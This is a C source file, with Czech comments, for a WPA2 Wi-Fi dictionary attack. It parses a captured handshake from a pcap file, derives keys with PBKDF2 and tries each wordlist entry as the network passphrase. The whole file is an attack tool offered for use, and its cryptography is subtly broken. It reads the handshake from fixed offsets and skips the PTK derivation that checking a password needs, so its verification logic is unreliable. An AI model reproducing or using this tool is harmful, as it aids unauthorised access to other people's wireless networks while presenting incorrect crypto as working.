#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/pkcs12.h>
#include <getopt.h>
#include <signal.h>
#include <math.h>
#include <float.h>
#include <ctype.h>

// Struktura pro handshake
typedef struct {
    unsigned char anonce[32]; // Access Point Nonce
    unsigned char snonce[32]; // Client Nonce
    unsigned char mic[16];    // Message Integrity Code
} WPA2_HANDSHAKE;

// Funkce pro čtení pcap souboru a hledání WPA2 handshake
int read_pcap_handshake(const char *filename, WPA2_HANDSHAKE *handshake) {
    pcap_t *handle;
    struct pcap_pkthdr header;
    const unsigned char *packet;
    int found = 0;

    // Otevření pcap souboru
    handle = pcap_open_offline(filename, NULL);
    if (handle == NULL) {
        fprintf(stderr, "Error opening pcap file %s\n", filename);
        return -1;
    }

    // Procházení paketů
    while ((packet = pcap_next(handle, &header)) != NULL) {
        // Kontrola WPA handshake rámce
        if (packet[0] == 0x88 && packet[1] == 0x8e) {
            // WPA handshake paket detekován
            memcpy(handshake->anonce, packet + 0x10, 32);
            memcpy(handshake->snonce, packet + 0x30, 32);
            memcpy(handshake->mic, packet + 0x50, 16);
            found = 1;
            break;
        }
    }

    // Zavření pcap souboru
    pcap_close(handle);

    return found;
}

// Funkce pro výpočet PMK pomocí PBKDF2
int generate_pmk(const unsigned char *password, const unsigned char *ssid, unsigned char *pmk) {
    // PBKDF2 HMAC-SHA1 pro WPA2
    return PKCS5_PBKDF2_HMAC(password, strlen((char *)password), ssid, strlen((char *)ssid), 4096, EVP_sha1(), 32, pmk);
}

// Funkce pro ověření hesla (porovnání MIC)
int verify_password(const WPA2_HANDSHAKE *handshake, const unsigned char *password, const unsigned char *ssid) {
    unsigned char pmk[32];
    unsigned char calculated_mic[16];
    HMAC_CTX *ctx;

    // Generování PMK z hesla a SSID
    if (generate_pmk(password, ssid, pmk) != 1) {
        fprintf(stderr, "Error generating PMK\n");
        return 0;
    }

    // Inicializace HMAC kontextu
    ctx = HMAC_CTX_new();
    if (ctx == NULL) {
        fprintf(stderr, "Error initializing HMAC context\n");
        return 0;
    }

    // Výpočet HMAC
    HMAC_Init_ex(ctx, pmk, 32, EVP_sha1(), NULL);
    HMAC_Update(ctx, handshake->anonce, 32);
    HMAC_Update(ctx, handshake->snonce, 32);
    HMAC_Final(ctx, calculated_mic, NULL);
    HMAC_CTX_free(ctx);

    // Porovnání vypočítaného MIC s původním MIC
    if (memcmp(calculated_mic, handshake->mic, 16) == 0) {
        return 1; // Heslo je správné
    } else {
        return 0; // Heslo je nesprávné
    }
}

// Funkce pro slovníkový útok
void dictionary_attack(const char *pcap_file, const char *wordlist, const unsigned char *ssid) {
    WPA2_HANDSHAKE handshake;
    FILE *wordlist_file;
    char password[256];

    // Načtení handshake z pcap souboru
    if (read_pcap_handshake(pcap_file, &handshake) != 1) {
        fprintf(stderr, "No WPA2 handshake found in pcap file\n");
        return;
    }

    // Otevření souboru se slovníkem
    wordlist_file = fopen(wordlist, "r");
    if (wordlist_file == NULL) {
        fprintf(stderr, "Error opening wordlist file\n");
        return;
    }

    // Procházení slovníku
    while (fgets(password, sizeof(password), wordlist_file) != NULL) {
        // Odstranění nového řádku
        password[strcspn(password, "\n")] = 0;

        printf("Trying Passphrase: %s\n", password);

        // Ověření hesla
        if (verify_password(&handshake, (unsigned char *)password, ssid)) {
            printf("KEY FOUND! [%s]\n", password);
            fclose(wordlist_file);
            return;
        }
    }

    // Pokud heslo nebylo nalezeno
    printf("KEY NOT FOUND\n");
    fclose(wordlist_file);
}

int main(int argc, char *argv[]) {
    char *pcap_file = NULL;
    char *wordlist = NULL;
    unsigned char ssid[] = "MyWiFiSSID"; // Zadejte SSID vaší sítě

    // Zpracování příkazového řádku
    int opt;
    while ((opt = getopt(argc, argv, "f:w:")) != -1) {
        switch (opt) {
            case 'f':
                pcap_file = optarg;
                break;
            case 'w':
                wordlist = optarg;
                break;
            default:
                fprintf(stderr, "Usage: %s -f <pcap_file> -w <wordlist>\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (pcap_file == NULL || wordlist == NULL) {
        fprintf(stderr, "Usage: %s -f <pcap_file> -w <wordlist>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Spuštění slovníkového útoku
    dictionary_attack(pcap_file, wordlist, ssid);

    return 0;
}
